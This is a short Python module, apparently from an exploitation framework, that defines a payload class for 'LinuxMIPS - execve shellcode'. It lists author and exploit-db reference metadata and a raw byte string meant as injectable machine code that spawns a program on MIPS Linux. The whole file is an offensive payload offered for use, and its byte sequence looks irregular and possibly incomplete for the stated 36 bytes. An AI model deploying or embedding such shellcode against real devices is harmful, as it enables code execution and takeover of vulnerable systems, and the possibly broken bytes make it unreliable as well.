from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Sanguine"
    Shellcode.info["name"] = "LinuxMIPS - execve shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/35868/"
    ]
    Shellcode.info["size"] = 36
    Shellcode.info["payload"] = [
        r"\xff\xff"
        r"\x06\x28\xff\xff\xd0"
        r"\x04\xff\xff\x05\x28"
        r"\x01\x10\xe4\x27\x0f"
        r"\xf0\x84\x24\xab\x0f"
        r"\x02\x24\x0c\x01\x01\x01"	
    ]
